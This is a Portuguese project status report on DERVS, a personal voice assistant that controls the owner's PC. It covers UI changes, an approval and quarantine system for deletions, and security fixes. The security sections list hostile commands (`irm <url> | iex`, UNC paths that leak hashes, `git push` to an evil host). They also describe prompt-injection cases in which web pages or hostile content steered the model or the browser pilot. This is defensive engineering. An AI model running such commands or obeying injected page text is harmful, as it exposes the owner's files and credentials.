# Estado do DERVS — 23/09/2026

O que funciona, o que não funciona, e o que falta. Escrito para ser lido pelo
dono, não por um programador.

Última verificação: 28/09/2026. **867 testes verdes** no ambiente do
projeto (`dervs-venv`), que é onde o DERVS de fato roda. Nenhum erro de
coleta, que é o que impede um arquivo quebrado de esconder a suíte inteira.

**Onda A da central do PC (29/09/2026): o widget deixou de existir.** O painel
grande é agora a janela única do DERVS: abre sozinho, `Ctrl+Alt+D` é o único
atalho (o `Ctrl+Alt+Shift+D` do widget saiu), a bandeja tem só "Abrir DERVS /
Sair do DERVS" e o clique no ícone alterna o painel. O cartão de confirmação de
plano, o botão REUNIÃO 1H e o ABRIR DERVS APP foram portados para o painel; o
botão do meio da barra minimiza de verdade. `index.html` e `hud.js` foram apagados.
O cache do Chromium foi para `%APPDATA%\dervs\electron` (fora do `config.json`).
Sem prova visual ainda: a foto da janela com os três botões e o cartão de plano.

**Onda C da central do PC (29/09/2026): a trava de aprovação existe, mas ainda
não está ligada a nenhum botão.** É a sua regra virada código: "não pode apagar
nada sem antes analisar tudo e me dizer o que é cada coisa; sempre com minha
aprovação". Quatro peças, todas testadas sozinhas (192 testes novos; suíte
inteira: 1060 verdes depois da revisão de segurança do mesmo dia):

- `dervs_caminhos_protegidos.py` — o que **nunca** se apaga, nem com clique:
  Windows, Arquivos de Programas, ProgramData, a raiz de qualquer disco, o seu
  perfil e o de outros usuários, `.git`, `.claude`, `.ssh`, `.gnupg`,
  `source\repos`, a configuração do DERVS, e as pastas Documentos/Área de
  Trabalho/Downloads/Imagens/OneDrive inteiras (um arquivo solto lá dentro
  pode, com análise; em massa, não). Não se engana com grafia torta, `..`,
  nome curto `PROGRA~1`, `\\?\`, ponto ou espaço no fim, nem com atalho ou
  junção — atalho no caminho é recusa, sempre.
- `dervs_aprovacao.py` — analisa cada item e monta o relatório: o que é (em
  português), onde está, tamanho, data, por que é seguro, o que muda, como
  desfazer, e uma impressão digital do conteúdo. Aprovação só por **clique**
  (voz, Claude e qualquer outro programa são recusados), item por item (não
  existe "aprovar tudo"), risco alto com confirmação dupla, vale 15 minutos e
  uma vez só.
- `dervs_executor_seguro.py` — o único que mexe no disco. Confere tudo de novo
  na hora (se o arquivo mudou depois da análise, ou foi trocado por uma cópia
  idêntica, recusa) e **nunca apaga**: move para a quarentena
  (`%LOCALAPPDATA%\dervs\quarentena\`), de onde o Desfazer devolve o item
  exatamente para onde estava. A revisão de segurança provou que dava para
  trocar a pasta de uma "isca" por um atalho para uma pasta protegida no
  instante entre conferir e mover; agora o item é **segurado aberto** enquanto
  é conferido e movido (o Windows não deixa ninguém trocá-lo nesse meio
  tempo), e o ataque do revisor falhou 10 de 10 vezes. Antes de mover, grava
  "vai executar" no registro — se não conseguir gravar, não move. A Lixeira do Windows e
  as ações de programa/sistema (desinstalar, serviço, registro, firewall)
  passam pelas mesmas travas e param em "não implementado nesta versão".
- `dervs_log_acoes.py` — `%LOCALAPPDATA%\dervs\acoes.jsonl`: tudo que foi
  analisado, proposto, aprovado, recusado (com o motivo), executado e
  desfeito. Cada linha carrega o hash da anterior: isso denuncia linha
  estragada ou mexida sem cuidado, mas **não** quem recalcula todos os hashes
  de propósito. Com o DERVS aberto há uma segunda defesa: ele lembra onde
  parou e grava um "alerta" se o arquivo mudou por fora. Chave, token e senha
  são apagados antes de gravar.

Também entram na lista do que nunca se apaga: as chaves e senhas guardadas
pelo Windows (`Microsoft\Protect`, `Credentials`, `Vault`), os perfis dos
navegadores (Chrome, Edge, Brave, Firefox), `C:\Recovery`, qualquer item
marcado como "de sistema", e as pastas Documentos/Área de Trabalho/Downloads
de verdade, perguntadas ao Windows (valem mesmo se foram mudadas para o D:).

**LEIA-ME — onde ficam os dados de paciente.** Na primeira vez que o motor
rodar, ele cria `%APPDATA%\dervs\caminhos_protegidos.json`. Ponha ali as pastas
dos programas que guardam dado de paciente, com barra dupla:
`{"caminhos": ["D:\\Consultorio", "C:\\Users\\Desktop\\Documents\\Prontuarios"]}`.
Vale na hora, sem reiniciar. Se o arquivo ficar com erro de digitação, o DERVS
se recusa a apagar **qualquer coisa** até ele ser consertado. Esses caminhos
são lidos só na sua máquina e nunca vão para o Claude nem para a OpenAI.
**Isso depende de você: diga quais programas guardam dado de paciente.**

O que falta para chegar à tela: a onda B liga o `propor_acao` do Claude à
`Fachada` (só analisar e consultar) e o clique do painel ao
`aprovar`/`executar`/`desfazer`. **Regra dura para a onda B: o Claude recebe
só a `Fachada`, nunca o `Motor`** — o cartão do relatório e a senha de
aprovação só vão para o painel; a onda D usa o motor
na limpeza de temporários, e decide o que fazer com `C:\Windows\Temp`, que
hoje é protegido junto com todo o `C:\Windows`.

**A cara mudou nesta rodada (16–17/09/2026): a tela agora é um HUD Electron**
(painel ciano/preto, estilo "painel de controle", com anéis girando e um
núcleo que reage à voz), não mais a janela Qt com o selo dourado flutuante. O
Qt continua rodando por baixo — motor invisível, ver `dervs_electron.py` — só
quem desenha a tela mudou. O ponto de entrada padrão passou a ser
`dervs_electron.py` (era `dervs.py`); `dervs.py` continua no disco e ainda
abre se chamado na mão, mas não é mais o que o atalho usa.

**Segunda rodada no mesmo dia (17/09/2026) — fase 1 de "painel completo":**
o dono relatou o HUD "quebrado/sem botão" — na prática a janela estava viva,
mas ficava escondida atrás de outras janelas sem nenhum aviso, e a tela era
bem mais pobre do que a referência JARVIS/Rainmeter que ele mandou. Depois de
duas perguntas de escopo (registradas em
`docs/esteira/dervs-painel-completo/briefing.md`), esta rodada entregou:

- Janela **sempre visível por cima** das outras (`alwaysOnTop`, nível
  "screen-saver") e **ancorada no canto superior direito** da tela, como um
  widget de desktop — resolve o "sumiço" que parecia o app morto.
- Janela **transparente de verdade** (`transparent: true`) — o desktop atrás
  aparece por baixo do tom ciano. **Achado técnico, testado em bancada:**
  `backgroundMaterial: "acrylic"` (o material nativo do Windows 11 que
  borraria o desktop de verdade) **conflita** com `transparent: true` nesta
  versão do Electron (33.2.1) e deixa a janela OPACA — por isso ele foi
  deixado de fora, de propósito (comentário em `electron/main.js`). O efeito
  hoje é "vidro liso" (transparente, sem borrão), não "vidro fosco" — mais
  simples que o pedido original, mas funcional.
- **Relógio e data ao vivo**, e um **painel com CPU/RAM/disco reais** desta
  máquina (`dervs_sistema.py`, biblioteca `psutil`, nova dependência em
  `requirements.txt`) — atualiza a cada ~2s pela mesma ponte que já existia.
- Botão **"Abrir DERVS App"**, que abre `http://localhost:4777` (configurável
  em `dervs_app_url`) no navegador — só isso; a integração de verdade com o
  outro projeto do dono (`garcia-goncalves/dervs`) ficou combinada como fase 2,
  separada, porque mexe em login/cofre daquele projeto.
- 18 testes novos/atualizados (`test_dervs_sistema.py`,
  `test_dervs_ponte_electron.py`, `test_dervs_config.py`,
  `test_dervs_electron_entrada.py`); suíte inteira em 624 verdes.
- Testado ao vivo: app reaberto do zero, janela fotografada (com e sem outras
  janelas por cima), relógio/CPU/RAM variando de verdade entre capturas,
  clique real no botão novo sem derrubar o app.

**Pendência que NÃO foi fechada nesta rodada e precisa do dono presente:** a
Etapa 12 do plano (demonstração ao vivo com voz real e medição de CPU) ainda
não aconteceu. Nada aqui foi testado com a voz do dono, e não há número de CPU
medido ao vivo enquanto ele fala — só o que os 624 testes automatizados
cobrem e o que foi visto ao vivo sem áudio (ver acima). Não confunda "testes
passam" com "demonstrado funcionando com voz real": são coisas diferentes, e
a segunda ainda está pendente.

**Terceira rodada (23/09/2026) — o que fechou:**

- **O botão do microfone voltou ao HUD** (era o item 2.2). Verbo novo `microfone`
  na ponte, nos dois sentidos; o botão só muda de cara quando o Python confirma.
  Provado ao vivo: clique → "MICROFONE LIGADO" → o DERVS fala "Tô ligado" →
  clique → "DESLIGADO", e a escolha fica gravada.
- **Defeito sério achado testando ao vivo: o Python não encerrava quando o
  Electron fechava** ("Sair do DERVS" ou queda). Ele chamava `quit()` da thread
  errada; o Qt ignora. Resultado: o DERVS ficava vivo, sem cara, **com o
  microfone aberto**, e o atalho seguinte "não fazia nada" (avisava um Electron
  que já não existia). É uma causa provável dos "sumiu / bugou" que você
  relatou. Corrigido e provado: derrubando o Electron, o Python e todos os
  ajudantes encerram sozinhos em segundos.
- **Navegador autônomo funciona no Windows** (era o item 2.3). O perfil padrão
  era o de Linux — e ficou **gravado no seu `config.json`**, vencendo a correção;
  agora o valor antigo é curado na leitura. O Playwright entrou no
  `requirements.txt` (usa o Chrome que já está instalado, sem baixar navegador).
  Provado ao vivo com perfil vazio: abriu example.com e leu o título.
  **Com os logins do seu Chrome só funciona com ele FECHADO** (o perfil só abre
  num lugar por vez) — e não testei em cima do seu Chrome aberto, de propósito.
- **Diário do porteiro** (item 4.5) e **testes dos três ajudantes de voz** (4.6).
- **Electron 33.2.1 → 44.4.5**: a 33 saiu de suporte e o `npm audit` acusava
  20+ avisos (4 altos); agora zero.
- Janela 420×560 → 420×620 (o botão novo cortava o rodapé).

**Quarta rodada (23/09/2026) — três funções do HUD, provadas ao vivo:**

- **Atalho global Ctrl+Alt+D:** apertado com a janela à vista, ela some; apertado
  de novo, volta. Minimizar a janela (Win+D) agora é desfeito na hora — provado
  minimizando por fora e vendo a janela de volta. O atalho é solto ao sair.
- **Cartão do diário** (`dervs_diario.py`, verbo `diario`): apareceu
  "HOJE: 1 ouvidas · 1 acordei", igual à contagem feita à mão no `porteiro.jsonl`.
- **Modo reunião** (`Motor`, verbo `reuniao`): clique → "REUNIÃO 59:57" e
  microfone desligado; clique de novo → microfone ligado, botão volta a
  "REUNIÃO 1H". `escuta_ao_abrir` conferido depois: **continuou como estava**
  (a reunião restaura o valor que o caminho do botão grava). Fim da hora e
  cancelar por microfone manual provados nos testes com relógio injetado.
- Janela 420×620 → 420×700: o cartão de erro ("não chegou som") + o cartão do
  diário juntos cortavam o botão "Abrir DERVS App".
- Limite honesto: a hora inteira de reunião não foi esperada ao vivo (só o início
  e o cancelamento); o fim é coberto pelos testes.
- **Lembretes por voz** (`dervs_lembretes.py`, atalho local em `dervs_atalhos.py`):
  "me lembra em 10 minutos de ligar para o cliente", "às 15h30", "amanhã às 9",
  "daqui a 2 horas me avisa da reunião". 100% local, sem custo. Lista em
  `%APPDATA%\dervs\lembretes.json` (gravação atômica; arquivo torto vira lista
  vazia); um relógio de 1 s na `PopUp` avisa em voz e no HUD, sem interromper
  fala em curso, e apaga o lembrete antes de falar (não repete). Vencido com o
  app fechado: "você tinha um lembrete às 13h: ...". Hora não entendida é
  RECUSADA em voz clara, nunca chutada; limite de 7 dias e 20 lembretes; o texto
  é só falado (nunca executado) e cortado em 200 caracteres. Provado ao vivo
  (app real, sem microfone): "em 1 minuto" gravou, confirmou, disparou no
  horário, apareceu no HUD e o arquivo ficou vazio. Limite honesto: o áudio da
  fala do aviso não foi conferido de ouvido, só o texto enviado à voz.
- Peso morto removido (item 4.7): `dervs_painel.py`, `falar.sh`,
  `ligar-voz-com-senha.sh` — continuam no histórico do Git, dá para voltar.

---

## 1. O que está funcionando agora

| Parte | Estado | Onde roda | Custo |
|---|---|---|---|
| O HUD (janela Electron ciano/preto, novo desde 16/09) | **funciona** | sua máquina | zero |
| Janela sempre visível por cima, ancorada no canto (novo 17/09) | **funciona** | sua máquina | zero |
| Janela transparente (novo 17/09 — sem o borrão do desktop, ver acima) | **funciona** | sua máquina | zero |
| Relógio/data e painel CPU/RAM/disco reais (novo 17/09) | **funciona** | sua máquina | zero |
| Botão "Abrir DERVS App" (novo 17/09 — só abre, sem integração ainda) | **funciona** | sua máquina | zero |
| Botão liga/desliga do microfone (voltou 23/09) | **funciona** | sua máquina | zero |
| Navegador autônomo (23/09, Chrome fechado) | **funciona** | sua máquina + OpenAI | centavos por tarefa |
| Diário do porteiro (23/09) | **funciona** | sua máquina | zero |
| Abrir por atalho (Área de Trabalho e menu Iniciar, agora abre `dervs_electron.py`) | **funciona** | sua máquina | zero |
| Um DERVS só de cada vez (o 2º clique traz de volta o 1º) | **funciona** | sua máquina | zero |
| Porteiro — "isso foi comigo?" | **funciona** | sua máquina | zero |
| Transcrição precisa (fala → texto) | **funciona** | OpenAI | ~US$ 0,0045/min |
| Voz do DERVS (Kokoro, `pm_alex`, 1,3×) | **funciona** | sua máquina | zero |
| Cérebro (decide o que fazer) | **funciona** | OpenAI `gpt-4.1-mini` | barato |
| Executar comando com trilhos de risco | **funciona** | sua máquina | zero |
| Transcrever um arquivo de áudio (atalho separado) | **funciona** | OpenAI | por minuto |
| Registro de queda (grava o motivo se o app morrer) | **funciona** | sua máquina | zero |
| Aviso de "não entrou som" | **funciona** (novo, 02/09) | sua máquina | zero |

---

## 2. O que está quebrado, e de quem é a culpa

### 2.1. Você não tem microfone ligado no computador — e essa é a única coisa que falta a sua mão

Esta é a causa do "o DERVS não está me ouvindo". **Não é defeito do programa.**

O que foi medido na sua máquina, em 02/09/2026:

- a última gravação que você fez (19h59) tinha 4,71 segundos e **pico 1 numa
  escala de 32.767** — isso é silêncio absoluto, não "falou baixo";
- gravando 3 segundos de **cada** entrada de áudio da máquina, uma por uma,
  todas devolveram o mesmo silêncio;
- no registro do Windows, as duas entradas de microfone do gabinete —
  `Front Pink In` (frente) e `Rear Pink In` (traseira) — aparecem como
  **DESCONECTADO**;
- não há microfone USB, nem webcam com microfone, nem fone Bluetooth.

O microfone também estava **mudo** no Windows. Isso foi desligado (agora está
em 90% e sem mudo), mas o silêncio continuou — ou seja, o mudo era um segundo
problema empilhado, não a causa.

**O que fazer:** ligar um microfone na entrada **rosa** do gabinete, de
preferência a de trás. Depois disso o DERVS ouve na hora, sem reinstalar nada
— o Windows já reconhece a placa de som (Realtek) e a permissão de microfone
já está liberada para programas de área de trabalho.

Se você ligar e ainda não funcionar, o DERVS agora **diz o motivo na tela** em
vez de mostrar um campo vazio (item 3.1 abaixo).

### 2.2. ~~O microfone perdeu o botão de liga/desliga na tela~~ — RESOLVIDO em 23/09/2026

*(O texto abaixo é o histórico; o botão voltou — ver "Terceira rodada", acima.)*

**Consequência direta da troca de tela (16/09/2026): hoje não existe mais um
botão no HUD para desligar o microfone.** A janela Qt antiga tinha o
interruptor **🎙️ Ei DERVS** / **🔴 Ouvindo**; o HUD do Electron não tem — foi
tirado, não é bug. Isso é algo que o dono podia fazer clicando na tela e hoje
não pode mais.

Hoje, com o DERVS aberto, o microfone fica ligado o tempo todo. As únicas
formas de desligar são:

- sair do DERVS (bandeja → "Sair do DERVS"); ou
- editar `escuta_ao_abrir` para `false` em `%APPDATA%\dervs\config.json` e
  reabrir (o padrão de fábrica é `true`).

Não muda o que sai da máquina (o funil do porteiro continua intacto — nada vai
para a nuvem antes do nome ser ouvido), só o controle fino de "escutar agora
ou não" que existia na tela sumiu. Se isso incomodar, é trabalho de meia hora
trazer o botão de volta ao HUD.

### 2.3. ~~O navegador autônomo não funciona no Windows~~ — RESOLVIDO em 23/09/2026

*(Histórico; ver "Terceira rodada", acima. O que resta: o Chrome do dono tem de
estar fechado para o autônomo usar o perfil com os logins.)*

O DERVS sabe pilotar o Chrome sozinho ("entra no meu Gmail e vê quantos não
lidos"). Todo o código existe e está testado. **Mas o ambiente que ele precisa
(Playwright) nunca foi montado no Windows** — o caminho procurado
(`~/voice/playwright-venv`) é do Linux, e não existe instalador para Windows em
lugar nenhum do projeto.

Hoje, se um plano pedir o navegador, o DERVS devolve um recado de erro em vez
de travar. Mas a funcionalidade está indisponível.

**Falta:** escrever o instalador dessa parte. É trabalho de meia hora a uma
hora, e depende de você querer a funcionalidade.

---

## 3. O que foi corrigido nesta sessão (02/09/2026, noite)

### 3.1. O DERVS ficava calado quando não entrava som

Você gravou 4,71 segundos de silêncio. O DERVS mandou aquilo para a OpenAI,
**pagou a chamada**, recebeu texto vazio e mostrou um campo em branco — sem
explicar nada. Você concluiu, com toda a razão, que "a transcrição não
funciona". Ela funcionava; a entrada é que não existia.

Agora: gravação sem som **não vai para a nuvem** (economiza dinheiro) e a tela
diz o motivo. Vale nos dois modos:

- apertando **Gravar**: aviso imediato;
- na **escuta contínua** ("Ei DERVS"): depois de 8 segundos de silêncio digital
  seguido, o DERVS avisa uma vez — antes ele ficava escrito "pronto" enquanto
  estava surdo, e você passava horas achando que estava sendo ignorado.

### 3.2. A janela preta

Eram os terminais dos dois ajudantes do DERVS (o que ouve e o que fala). Os
dois eram abertos com a versão do Python que **vem com** janela de terminal, e
sem ninguém mandar escondê-la. Corrigido, e provado: depois de reiniciar, não
sobra nenhum terminal pendurado no DERVS.

### 3.3. Comando podia continuar rodando depois de "interrompido"

Quando um comando passava do tempo, o DERVS matava só a casca. Exemplo real: se
você pedisse "roda o nmap no alvo" e passasse de 60 segundos, a tela dizia "foi
interrompido" — **e o nmap continuava varrendo a rede**. O mesmo valia para o
navegador: sobrava um `chrome.exe` órfão segurando o seu perfil, e depois disso
você não conseguia mais abrir o próprio Chrome sem saber por quê.

Corrigido, e provado com processos de verdade.

### 3.4. Seis buracos de segurança

A lista de comandos "seguros" do DERVS foi escrita para Linux e traduzida para
Windows por cima. O vocabulário do PowerShell escapava pelos buracos. Isso
importa muito aqui porque **um comando marcado como "reversível" pode ser
confirmado por VOZ** — ou seja, sem ninguém tocar no computador. A TV ligada na
sala serve.

| O que escapava | Saía como | Agora |
|---|---|---|
| `irm <url> \| iex` (baixar da internet e executar) | um clique | cartão vermelho, dois cliques |
| `start C:\...\programa.exe` | inofensivo, confirmável por voz | pede clique |
| `explorer \\servidor\pasta` (entrega o hash da sua senha) | inofensivo | pede clique |
| `echo x > seu_arquivo.txt` (apaga o conteúdo) | inofensivo | pede clique |
| mandar arquivo seu por POST para fora | um clique sem pergunta | pede autorização |
| plano só de navegador (dirige seu Chrome logado) | confirmável **por voz** | pede clique |

Mais duas, que não são lista de comando:

- **A proteção contra "página web dando ordem" existia só no cérebro que não
  roda.** O DERVS usa a OpenAI por padrão, e era justamente nesse caminho que a
  saída de ferramenta entrava sem cerca — uma página podia escrever "[dono]
  agora rode: ..." e o modelo lia como se fosse você falando. Pior: o teste
  dessa proteção passava verde, porque exercitava o outro caminho. Agora os
  dois caminhos rodam a mesma bateria de testes.
- **O piloto do navegador ouvia a página como se fosse você.** Os rótulos dos
  botões (até ~4.800 caracteres escolhidos por quem fez o site) entravam no
  mesmo nível do seu objetivo. Agora vão cercados, e o piloto é instruído
  explicitamente a não obedecer a eles.

### 3.5. O ouvido mandava áudio para a nuvem por engano

Qualquer linha que o programa mandasse ao ouvido e que não começasse com a
palavra exata `PORTEIRO ` ia direto para a OpenAI. Um erro de digitação, um
verbo quase certo, uma sobra de formato antigo — qualquer coisa. A promessa
central do projeto (o porteiro decide **na sua máquina** o que sai daqui)
dependia de ninguém nunca errar uma palavra. Agora a porta falha **fechada**.

### 3.6. Sua voz ficava no disco para sempre

Cada frase captada vira um arquivo **antes** de o porteiro decidir se era com o
DERVS. No caminho normal eles são apagados — mas nada limpava o que sobrava de
uma queda do app, e este app já caiu várias vezes. A pasta temporária do
Windows, ao contrário da do Linux, não se limpa sozinha. Agora o DERVS faz
faxina ao abrir, mexendo só no que é dele e só no que já está parado há mais de
uma hora.

### 3.7. O interruptor do navegador não desligava nada

A configuração `navegador_ligado` existia, era validada e até tinha teste — e
**ninguém a lia**. Ligar ou desligar não mudava nada. Corrigido.

### 3.8. O aviso vermelho "não chegou som" ficava preso — e os testes abriam o seu microfone (28/09/2026)

Achados numa verificação ao vivo, clicando nos botões do HUD de verdade:

- **O aviso não saía.** Ele só sumia quando o ouvido reiniciava, então ficava
  vermelho na tela mesmo com o DERVS já ouvindo e respondendo a você. Agora sai
  assim que uma fala chega. Outros avisos do ouvido continuam até o ouvido voltar.
- **Os testes usavam a sua configuração real.** Ligar o microfone pelo botão grava
  `escuta_ao_abrir: true` em `%APPDATA%\dervs`; a partir daí, todo teste que criava
  a janela abria o microfone de verdade, e a suíte caía com `0xc0000374` em ponto
  aleatório. Agora o `conftest.py` usa uma pasta temporária, copia a configuração
  (sem segredo) e força a escuta fechada. Três rodadas seguidas: 815 verdes.
- **Confirmado ao vivo:** botão do microfone liga, botão REUNIÃO 1H liga e cancela,
  e o DERVS ouviu e respondeu a uma frase sua. O HUD mostra CPU, RAM e disco reais.

### 3.9. O painel grande estilo JARVIS (28/09/2026, branch `feat/painel-jarvis`)

Pedido do dono: "um painel incrível... como se fosse o JARVIS bem completo".
Contrato em `docs/esteira/dervs-painel-jarvis/briefing.md`; como usar, em
`COMO-USAR.md` ("O painel grande").

- **Janela nova** (`electron/renderer/painel.html/.css/.js`, criada sob demanda em
  `main.js`): 1280×800, translúcida, sem moldura, redimensionável pela alça e pelo
  botão "ocupar a tela". **`Ctrl+Alt+D` agora alterna o painel**; o widget compacto
  (420×700, igual a antes) ganhou o botão **PAINEL** e o atalho `Ctrl+Alt+Shift+D`.
  Com o painel aberto o widget se esconde (senão tapa o canto), e volta sozinho se
  um plano pedir confirmação.
- **Dados reais:** CPU/RAM/disco/rede (rede é nova: KB/s por `psutil`, campo opcional
  do verbo `sistema`), agenda (`dervs_lembretes.Agenda`), diário (`dervs_diario.
  entradas_recentes`, só metadados), voz nuvem/local, internet, conversa e ações.
  Verbos novos da ponte: `gasto`, `agenda`, `diario_entradas`, `voz`, `acao`
  (`dervs_ponte_electron.py`, cabeçalho; laço em `dervs_painel.py`, a cada 5 s, sem
  reenviar valor igual).
- **Gasto do dia** (`dervs_gasto.py`): linha em `%LOCALAPPDATA%\dervs\gasto.jsonl` a
  cada voz de nuvem (US$ 0,015/min de wav), transcrição (US$ 0,006/min) e resposta do
  cérebro (por `usage`). **É estimativa.** Sob pytest não grava no arquivo real.
- **CPU do DERVS parado, medida** (Python + Electron, 10 s): **0,34 núcleo antes,
  0,11 depois**, e 0,04–0,12 com o painel aberto. O ganho veio de o widget deixar de
  desenhar a 60 quadros/s parado (agora 10 sem foco e sem voz, ~30 no resto). No painel:
  30 quadros/s com foco, 10 sem foco, 0 escondido.
- **Testes:** `test_dervs_gasto.py` (registrador e os quatro pontos que o chamam),
  `test_dervs_painel.py` (verbos, agenda, diário, rede), `test_dervs_painel_js.py`
  (roda `electron/renderer/painel-formato.test.js` no Node), mais a ação no
  `test_dervs_electron_entrada.py`. Rode com o Python do `dervs-venv` (o do sistema
  não tem PyQt6 e falha 3 testes de lembretes por isso).
- **Achados:** o preload compartilhado agora expõe também `alternarPainel` e os
  controles do painel; o texto de fora (conversa, título de lembrete) entra só por
  `textContent` — provado com `<img onerror>` na conversa, que apareceu como texto.

---

## 4. O que ainda falta

Em ordem de valor para você:

### 4.0. A demonstração ao vivo do HUD novo — PARCIAL, falta você falar perto do microfone

**Atualizado em 17/09/2026, com medição real:**

- **A janela abre e fica de pé — confirmado ao vivo, na sua máquina.** Achado
  e corrigido um bug sério nessa mesma verificação: o Electron não conseguia
  ficar aberto em NENHUM Windows (recebia um sinal falso de "o Python
  morreu" quase na hora de subir — limitação do Chromium no Windows, não
  defeito do projeto). Corrigido trocando a forma como o Python fala com o
  Electron (de `stdin` para um soquete local, `127.0.0.1`). Depois da
  correção: janela aberta, título "DERVS" visível, processos do Electron
  (principal, GPU, renderização) todos de pé e respondendo.
- **CPU medido de verdade, com a janela aberta e parada por 2 minutos:**
  em média **21% de um núcleo** somando Python + todos os processos do
  Electron — numa máquina com vários núcleos (Ryzen 7), isso é menos de 3%
  da CPU total da máquina. Não foi comparado lado a lado com o app antigo
  (`dervs.py`/Qt) nesta rodada — se um dia parecer pesado no dia a dia, o
  primeiro lugar a olhar é o `requestAnimationFrame` do HUD (`hud.js`), que
  desenha o núcleo e os anéis o tempo todo enquanto a janela está visível.
- **PR #1 mesclado na `main`** — a cara nova não é mais uma branch separada,
  é o que abre pelo atalho hoje.
- **Segundo bug achado e corrigido na mesma verificação, depois do merge:**
  o dono relatou "está bugado" e, ao tirar uma foto da tela, os cartões de
  erro e de plano apareciam **vazios desde a abertura do app**, mesmo sem
  nenhum erro ou plano ter acontecido. Causa: no CSS, a classe `.cartao`
  (e `.cartao-plano-autorizacao`) declara `display: flex`, que tem mais
  força que a regra padrão do navegador que esconde elemento com o
  atributo `hidden` — o `hidden` nunca vencia. Corrigido com uma regra
  `[hidden] { display: none !important; }` em `electron/renderer/estilo.css`
  (commit `dce1fe2`, direto na `main`). Confirmado com foto da tela antes e
  depois da correção.

**Ainda em aberto, sem data — só acontece com você por perto:**
- ouvir você falar de verdade perto do microfone e ver a onda reagir, do
  jeito que você usa no dia a dia.

### 4.1. Os seus nomes próprios no vocabulário — depende de você

**A maior melhoria que sobrou, e ela é barata.** Ficou provado por medição que
o DERVS só acerta nome próprio que esteja escrito numa lista dentro do código:
o nome "DERVS" saiu de 0 acertos em 5 para 5 em 5 só por estar lá. As outras
palavras ficaram em 86% — praticamente o mesmo de antes.

Ou seja: a lista só ajuda no que está **escrito** nela. Hoje ela tem palavras
genéricas (WhatsApp, Firefox, GitHub, Docker) e **nenhum cliente, empresa ou
pessoa sua**.

**Falta:** você me passar 20 a 30 nomes que fala no dia a dia. Meia hora de
trabalho depois disso.

### 4.2. Provar com a sua voz e o seu barulho

Tudo até hoje foi medido com áudio sintetizado. Nada foi testado com a sua voz,
o seu microfone e o barulho da sua sala. Isso só dá para fazer depois do
item 2.1 (o microfone).

### 4.3. ~~Voz da nuvem~~ — FEITO em 28/09/2026

O dono achou a voz local robótica e com sotaque errado e pediu voz real, brasileira.
Agora o motor padrão é `openai` (`gpt-4o-mini-tts`, voz `echo` (masculina, escolhida de ouvido pelo dono em 29/09), com instrução fixa de
"português do Brasil, sotaque paulistano natural, nunca robótico"). Mede ~1,8 s para
gerar a primeira frase; as seguintes são geradas enquanto a anterior toca. Custa
centavos por fala e precisa de internet: **se a nuvem falhar, cai sozinha no Kokoro
local** (e a nuvem descansa 1 min antes de tentar de novo). Trocar de voz:
`voz_openai` no `config.json` (ash, onyx, echo, sage, verse, ballad, coral, nova,
shimmer, alloy, fable). Voltar ao local: `"motor": "kokoro"`. Com a nuvem ligada o
daemon do Kokoro (776 MB e ~80% de um núcleo enquanto sintetiza) nem sobe no boot.
**29/09 — voz trocada de `ash` ("mole") para `echo`** (masculina; ele ouviu 10 vozes e depois echo/nova/shimmer lado a lado). Instrução reescrita: energia média-alta, ritmo firme, sem arrastar. Se ainda não soar brasileira o bastante, o próximo passo é voz nativa pt-BR (Azure Neural Francisca/Antonio, 500 mil caracteres grátis/mês) — depende de o dono criar a conta e passar a chave.
**29/09 - bug do gasto inflado (achado na foto do painel):** cada fala de nuvem era registrada como ~US$ 22 porque o gasto media o wav ANTES de consertar o cabecalho `0xFFFFFFFF` (89 mil s). Agora mede depois (`sintetizar_openai`), com teste. As 23 linhas erradas do `gasto.jsonl` do dono foram trocadas por US$ 0,001 e marcadas como corrigidas.
**29/09 - onda A da central do PC mesclada** (`51bbc89`): painel unico, bandeja, minimizar/restaurar/fechar; a revisao typescript achou 1 bloqueio (foco em Confirmar) e 3 menores, todos corrigidos. Proximas: B (Claude Code real), C (aprovacao), D (Central), E (harness), F (instalador). Spec: `docs/esteira/dervs-central-do-pc/spec.md`.
**29/09 - onda B, 2ª revisão de segurança (achado IMPORTANTE, corrigido):** a classificação "reversível" do gancho reaproveitava a lista de comandos seguros do planejador de VOZ (`dervs_safety`), que aceita `chrome`, `explorer`, `code` só pelo prefixo: um Claude induzido por conteúdo hostil abria o navegador com dado da conversa na URL e passava sem diálogo. Agora a sessão tem lista PRÓPRIA e curta de leitura de verdade (`dir/ls/pwd/whoami/hostname/date/Get-Date/Get-Location/Get-ChildItem/gci/Get-Process/Test-Path/echo` com argumentos limpos, mais `git status/log/diff/show/branch` sem `-c/--output/--exec/--receive-pack/--upload-pack`); tudo fora dela é `ask` (inclui `env`, `set`, `history`, `find -exec/-delete`, `cat/type/Get-Content` - para ler arquivo existe a ferramenta Read, com filtro de segredos). Qualquer lançador (`chrome/msedge/firefox/explorer/code/xdg-open/start/Start-Process/ii/Invoke-Item/mshta/rundll32...`), qualquer `scheme://` e qualquer `\host` marcam `rede` e nível >= muda_estado. Read/Glob/Grep/LS negados em perfis de navegador (`User Data`, Firefox `Profiles`, Brave, Opera) e em `~/.claude.json`. A fila de pedidos cheia no painel agora NEGA o excedente explicitamente e o diálogo mostra "N pedido(s) aguardando". **Provado com o `claude` 2.1.284 real (haiku, pasta temporária):** (a) o subagente (ferramenta `Agent`) e o `Bash` que ele roda chegam ao PreToolUse do pai e ao `can_use_tool` do pai (com `agent_id` preenchido); (b) um hook PreToolUse do settings do dono que devolve `allow` RODOU (marcador gravado) e mesmo assim o `ask` do DERVS venceu: o `git tag` chegou ao `can_use_tool` e não executou (deny > ask > allow vale). Sem defesa extra necessária; a sessão ainda carrega os hooks do dono (pendência da onda E).
**29/09 - onda B, correção da revisão de segurança (veredito "corrija antes de mergear"):** (1) BLOQUEANTE: regra `allow` do settings do dono (ex.: `Bash(git push:*)`) resolvia a permissão ANTES do `can_use_tool` e o gancho só olhava 6 ferramentas - `git push https://evil/x.git HEAD` executava sem perguntar. Agora o gancho vale para TODA ferramenta (`matcher=None`) e devolve `ask` para tudo que não é leitura pura, ferramenta `mcp__dervs__*` ou Bash/PowerShell reversível; `git push/commit/remote`, `gh`, `curl`, `Start-Process`, `type`, `reg add` etc. nunca são reversíveis. Prova contra o `claude` real, com a regra allow de `git push`: sem o gancho o push EXECUTOU sem chamar o can_use_tool; com o gancho o pedido chegou ao can_use_tool (o `git remote add` para caminho inexistente foi negado pelo próprio gancho). (2) O comando com mais de 500 caracteres ou quebra de linha é negado; o diálogo mostra o comando inteiro e "(cortado: N caracteres escondidos)" para o resto dos parâmetros. (3) Integração com a onda C: `dervs_caminhos_protegidos.esta_protegido` devolve tupla `(bool, motivo)` e usamos `[0]`; o import é obrigatório e FALHA FECHADA (sem o módulo ou com 